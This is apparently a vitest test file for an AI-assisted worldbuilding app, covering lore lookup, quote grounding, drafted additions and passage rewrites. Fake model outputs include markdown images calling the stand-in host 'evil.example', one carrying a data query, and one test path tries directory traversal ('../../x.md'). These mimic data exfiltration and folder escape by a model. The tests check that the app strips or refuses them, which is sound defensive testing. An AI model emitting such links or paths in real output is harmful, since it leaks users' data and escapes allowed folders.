import { afterEach, describe, expect, it } from "vitest";
import { UnpublishedResponse } from "@frontier/schema";
import { lookUp, plainForQuotes } from "../src/ai/lore.js";
import { makeTestApp, type TestApp } from "./helpers/app.js";

let t: TestApp;
afterEach(() => t.close());

const SECRETS = { SECRETS_KEY: Buffer.alloc(32, 3).toString("base64") };
const MODEL = "test/talker";
const NIRANI = "04 Inhabitants/Nirani.md";
const VAAKH = "01 Universe/Vaakh.md";
const WATER = "01 Universe/Water.md";
const OLD = "99 Appendices/Old talk.md";
const LONG = "03 Places/Long Road.md";

const NOTES: Record<string, string> = {
  [NIRANI]:
    "# Nirani\n\nThe Nirani keep time by the pulse of the deep currents, which they call [[Vaakh]].\n" +
    "They have no written calendar.\n",
  [VAAKH]:
    "# Vaakh\n\nVaakh is counted in slow beats felt through the stone floors of the halls.\n",
  [WATER]: "# Water\n\nWater is plentiful in the lowlands.\n",
  "01 Universe/Rain.md": "# Rain\n\nRain brings water to the hills.\n",
  "01 Universe/Rivers.md": "# Rivers\n\nThe rivers carry water and stone.\n",
  "01 Universe/Wells.md": "# Wells\n\nWells give water in the dry months.\n",
  [OLD]: "# Old talk\n\nThe Nirani once had sun clocks.\n",
  [LONG]:
    "# Long Road\n\nA road.\n\n" +
    "## Stones\n\n" +
    "stone ".repeat(1400) +
    "\n\n## Tolls\n\nThe toll on the Long Road is paid in salt.\n",
};

interface Call {
  body: { model: string; messages: { role: string; content: string }[] };
}

/** Stands in for OpenRouter. Each answer is used once, the last one for every later call. */
function provider(answers: object[]) {
  const calls: Call[] = [];
  const fake: typeof fetch = async (input, init) => {
    if (String(input).endsWith("/models")) return Response.json({ data: [] });
    calls.push({ body: JSON.parse(String(init?.body)) });
    const answer = answers[Math.min(calls.length - 1, answers.length - 1)]!;
    return Response.json({
      choices: [{ message: { content: JSON.stringify(answer) } }],
      usage: { prompt_tokens: 900, completion_tokens: 200, cost: 0.004 },
    });
  };
  return { fake, calls };
}

async function start(answers: object[], models: Record<string, string> = { conversation: MODEL }) {
  const p = provider(answers);
  t = await makeTestApp(SECRETS, { fetch: p.fake, settleMs: 0 });
  await t.login();
  t.repo.pushFromOutside(NOTES);
  await t.services.sync();
  const res = await t.put("/api/settings/ai", { key: "sk-or-test-key-1234", models });
  expect(res.statusCode, res.body).toBe(200);
  return p;
}

const GROUNDED = {
  paragraphs: [
    {
      text: "The Nirani keep time by the pulse of the deep currents.",
      sources: [NIRANI],
      quotes: [{ path: NIRANI, text: "keep time by the pulse of the deep currents" }],
    },
    {
      text: "They count it in slow beats through stone.",
      sources: [VAAKH, "made/up.md"],
      // Written with the link as plain words and curly quotes: still found.
      quotes: [{ path: VAAKH, text: "counted in slow beats felt through the stone" }],
    },
    {
      text: "Their priests ring bells at dawn.",
      sources: [NIRANI],
      quotes: [{ path: NIRANI, text: "priests ring bells at dawn" }],
    },
  ],
  related: [
    { path: WATER, why: "Also about water." },
    { path: NIRANI, why: "Already cited." },
    { path: "nowhere.md", why: "Not there." },
  ],
  missing: "",
};

const ask = (question: string, conversation?: string) =>
  t.post("/api/lore", { question, ...(conversation ? { conversation } : {}) });

describe("looking up the lore", () => {
  it("names, searches, follows links, and never reads appendices or notes it may not read", async () => {
    await start([GROUNDED]);
    const { index, search } = t.services;
    const given = lookUp(index, search, "How do the nirani keep time?", []);
    expect(given[0]).toMatchObject({ path: NIRANI, why: "named" });
    expect(given.map((g) => g.path)).toContain(VAAKH);
    expect(given.find((g) => g.path === VAAKH)?.why).toBe("nearby");
    expect(given.map((g) => g.path)).not.toContain(OLD);
    const gated = lookUp(index, search, "How do the nirani keep time?", [], (p) => p !== NIRANI);
    expect(gated.map((g) => g.path)).not.toContain(NIRANI);
  });

  it("does not take a common word for a name unless it is written as one", async () => {
    await start([GROUNDED]);
    const { index, search } = t.services;
    const plain = lookUp(index, search, "is the water deep there", []);
    expect(plain.find((g) => g.path === WATER)?.why).not.toBe("named");
    const named = lookUp(index, search, "Tell me about Water", []);
    expect(named[0]).toMatchObject({ path: WATER, why: "named" });
  });

  it("sends the parts of a long entry that bear on the question", async () => {
    await start([GROUNDED]);
    const given = lookUp(t.services.index, t.services.search, "What is the toll on the Long Road?");
    const road = given.find((g) => g.path === LONG)!;
    expect(road.body).toContain("paid in salt");
    expect(road.body.length).toBeLessThan(7000);
    expect(road.body).toContain("left out");
  });

  it("reads a quote the way a person would: links as words, no emphasis, folded spaces", () => {
    expect(plainForQuotes("Counted  in *slow* beats, [[Vaakh|the pulse]] and [[Stone]]")).toBe(
      "counted in slow beats, the pulse and stone",
    );
  });
});

describe("asking the lore", () => {
  it("answers from the entries and checks every source, quote and related entry", async () => {
    const p = await start([GROUNDED]);
    const res = await ask("How do the Nirani keep time?");
    expect(res.statusCode, res.body).toBe(200);
    const { conversation } = res.json();
    const answer = conversation.turns[0].answer;
    expect(answer.paragraphs[0]).toMatchObject({ sources: [NIRANI], grounded: true });
    // A source that was not given is dropped; the quote still holds.
    expect(answer.paragraphs[1]).toMatchObject({ sources: [VAAKH], grounded: true });
    // A quote that is not in the entry is dropped, and the paragraph is not from the lore.
    expect(answer.paragraphs[2]).toMatchObject({ grounded: false, quotes: [] });
    expect(answer.droppedQuotes).toBe(1);
    expect(answer.related).toEqual([{ path: WATER, why: "Also about water." }]);
    expect(conversation.turns[0].given).toContain(NIRANI);
    expect(conversation.turns[0].costUsd).toBeCloseTo(0.004);
    expect(conversation.title).toBe("How do the Nirani keep time?");

    // The model was told the rules and given the entries as data.
    const sent = p.calls[0]!.body;
    expect(sent.model).toBe(MODEL);
    expect(sent.messages[0]!.content).toContain("Answer only from the entries");
    expect(sent.messages[1]!.content).toContain(`=== Entry: ${NIRANI}`);
    expect(sent.messages[1]!.content).not.toContain("sun clocks");
  });

  it("keeps a conversation, and gives a follow-up only what was backed by a quote", async () => {
    const p = await start([GROUNDED]);
    const first = (await ask("How do the Nirani keep time?")).json().conversation;
    const res = await ask("And their calendar?", first.id);
    expect(res.statusCode, res.body).toBe(200);
    expect(res.json().conversation.turns).toHaveLength(2);
    const second = p.calls[1]!.body.messages[1]!.content;
    expect(second).toContain("Question: How do the Nirani keep time?");
    expect(second).toContain("pulse of the deep currents");
    expect(second).not.toContain("ring bells at dawn");

    const list = (await t.get("/api/lore")).json();
    expect(list.conversations).toEqual([expect.objectContaining({ id: first.id, turns: 2 })]);
    expect(list.ready).toBe(true);
    expect((await t.del(`/api/lore/${first.id}`)).statusCode).toBe(200);
    expect((await t.get(`/api/lore/${first.id}`)).statusCode).toBe(404);
  });

  it("says when no model is chosen for conversations", async () => {
    await start([GROUNDED], { extraction: MODEL });
    const res = await ask("Anything?");
    expect(res.statusCode).toBe(409);
    expect(res.json().error.message).toContain("No model is chosen for lore conversations");
    expect((await t.get("/api/lore")).json().ready).toBe(false);
  });
});

describe("drafting an addition", () => {
  const MISSING = {
    paragraphs: [
      {
        text: "The Nirani keep time by the deep currents.",
        sources: [NIRANI],
        quotes: [{ path: NIRANI, text: "keep time by the pulse of the deep currents" }],
      },
    ],
    related: [],
    missing: "The entries do not say whether the Nirani mark years.",
  };

  it("drafts once, shows the difference, and keeps it as a draft of the chosen entry", async () => {
    const p = await start([
      MISSING,
      {
        path: NIRANI,
        text: "They mark a year by the turning of the currents. ![x](https://evil.example/?d=lore)",
      },
    ]);
    const c = (await ask("Do the Nirani mark years?")).json().conversation;
    const drafted = await t.post(`/api/lore/${c.id}/turns/0/addition`, {});
    expect(drafted.statusCode, drafted.body).toBe(200);
    const { addition } = drafted.json();
    expect(addition.text).toBe("They mark a year by the turning of the currents.");
    expect(addition.newPath).toBeNull();
    // Asking again returns what was drafted, at no cost.
    await t.post(`/api/lore/${c.id}/turns/0/addition`, {});
    expect(p.calls).toHaveLength(2);

    const preview = (
      await t.post(`/api/lore/${c.id}/turns/0/addition/preview`, { path: NIRANI })
    ).json();
    expect(preview.before).toBe(NOTES[NIRANI]);
    expect(preview.after).toBe(
      `${NOTES[NIRANI]!.trimEnd()}\n\nThey mark a year by the turning of the currents.\n`,
    );

    // Only an entry the answer was read from can take it.
    const elsewhere = await t.post(`/api/lore/${c.id}/turns/0/addition/preview`, { path: WATER });
    expect(elsewhere.statusCode).toBe(400);

    const kept = await t.post(`/api/lore/${c.id}/turns/0/addition/keep`, {
      path: NIRANI,
      base: preview.base,
    });
    expect(kept.statusCode, kept.body).toBe(200);
    expect(kept.json().conversation.turns[0].kept.path).toBe(NIRANI);
    const un = UnpublishedResponse.parse((await t.get("/api/unpublished")).json());
    const draft = un.drafts.find((d) => d.path === NIRANI)!;
    expect(draft.text).toBe(preview.after);
    expect(draft.origins).toEqual([{ kind: "lore", ref: `${c.id}/0`, model: MODEL }]);
  });

  it("refuses to keep it when the entry changed after the difference was shown", async () => {
    await start([MISSING, { path: NIRANI, text: "Years are marked." }]);
    const c = (await ask("Do the Nirani mark years?")).json().conversation;
    await t.post(`/api/lore/${c.id}/turns/0/addition`, {});
    const preview = (
      await t.post(`/api/lore/${c.id}/turns/0/addition/preview`, { path: NIRANI })
    ).json();
    t.repo.pushFromOutside({ [NIRANI]: `${NOTES[NIRANI]}Changed elsewhere.\n` });
    await t.services.sync();
    const kept = await t.post(`/api/lore/${c.id}/turns/0/addition/keep`, {
      path: NIRANI,
      base: preview.base,
    });
    expect(kept.statusCode).toBe(409);
    expect(kept.json().error.code).toBe("changed");
  });

  it("accepts a new entry next to the ones read, and nowhere that clashes", async () => {
    await start([
      MISSING,
      {
        path: "04 Inhabitants/Nirani Years.md",
        text: "# Nirani Years\n\nYears turn with the currents.",
      },
    ]);
    const c = (await ask("Do the Nirani mark years?")).json().conversation;
    const { addition } = (await t.post(`/api/lore/${c.id}/turns/0/addition`, {})).json();
    expect(addition.newPath).toBe("04 Inhabitants/Nirani Years.md");
    const preview = (
      await t.post(`/api/lore/${c.id}/turns/0/addition/preview`, { path: addition.newPath })
    ).json();
    expect(preview).toMatchObject({ isNew: true, before: "" });
    const kept = await t.post(`/api/lore/${c.id}/turns/0/addition/keep`, {
      path: addition.newPath,
      base: preview.base,
    });
    expect(kept.statusCode, kept.body).toBe(200);
    const un = UnpublishedResponse.parse((await t.get("/api/unpublished")).json());
    expect(un.drafts.find((d) => d.path === addition.newPath)?.kind).toBe("create");
  });

  for (const [why, path] of [
    ["an entry's name", "04 Inhabitants/Vaakh.md"],
    ["a folder no entry read is in", "05 Society/Nirani Years.md"],
    ["the appendices", "99 Appendices/Nirani Years.md"],
    ["Frontier's own folder", ".frontier/notes.md"],
    ["a way out of the library", "04 Inhabitants/../../x.md"],
  ] as const) {
    it(`does not propose a new entry with ${why}`, async () => {
      await start([MISSING, { path, text: "Years turn." }]);
      const c = (await ask("Do the Nirani mark years?")).json().conversation;
      const { addition } = (await t.post(`/api/lore/${c.id}/turns/0/addition`, {})).json();
      expect(addition.newPath).toBeNull();
    });
  }

  it("does not add to an entry marked for deletion", async () => {
    await start([MISSING, { path: NIRANI, text: "Years are marked." }]);
    const c = (await ask("Do the Nirani mark years?")).json().conversation;
    await t.post(`/api/lore/${c.id}/turns/0/addition`, {});
    const del = await t.put("/api/drafts", {
      id: "d".repeat(12),
      path: NIRANI,
      kind: "delete",
      text: "",
      revision: 0,
    });
    expect(del.statusCode, del.body).toBe(200);
    const preview = await t.post(`/api/lore/${c.id}/turns/0/addition/preview`, { path: NIRANI });
    expect(preview.statusCode).toBe(403);
    expect(preview.json().error.message).toContain("marked for deletion");
  });
});

describe("writing help", () => {
  it("rewrites a passage as asked, keeping to the lore, and leaves out pictures from the web", async () => {
    const p = await start([
      { text: "The Nirani count time by the deep currents. ![x](http://evil.example/a.png)" },
    ]);
    const res = await t.post("/api/write/rewrite", {
      path: NIRANI,
      passage: "The Nirani keep time by the pulse of the deep currents, which they call [[Vaakh]].",
      before: "# Nirani",
      after: "They have no written calendar.",
      how: "shorter",
    });
    expect(res.statusCode, res.body).toBe(200);
    expect(res.json().text).toBe("The Nirani count time by the deep currents.");
    const sent = p.calls[0]!.body.messages[1]!.content;
    expect(sent).toContain("Request: Make it shorter");
    expect(sent).toContain(`=== Entry: ${VAAKH}`);
    expect(sent).not.toContain(`=== Entry: ${NIRANI}`);
  });

  it("takes the author's own words as the request", async () => {
    const p = await start([{ text: "Rewritten." }]);
    await t.post("/api/write/rewrite", {
      path: NIRANI,
      passage: "Some words.",
      how: "Write it as a legend told by an elder.",
    });
    expect(p.calls[0]!.body.messages[1]!.content).toContain(
      "Request: Write it as a legend told by an elder.",
    );
  });

  it("is off without a model, and refuses what is not an entry", async () => {
    await start([{ text: "x" }], { extraction: MODEL });
    const off = await t.post("/api/write/rewrite", { path: NIRANI, passage: "x", how: "shorter" });
    expect(off.statusCode).toBe(409);
    const map = await t.post("/api/write/rewrite", {
      path: ".frontier/maps/abcdefgh.json",
      passage: "x",
      how: "shorter",
    });
    expect(map.statusCode).toBe(400);
  });
});
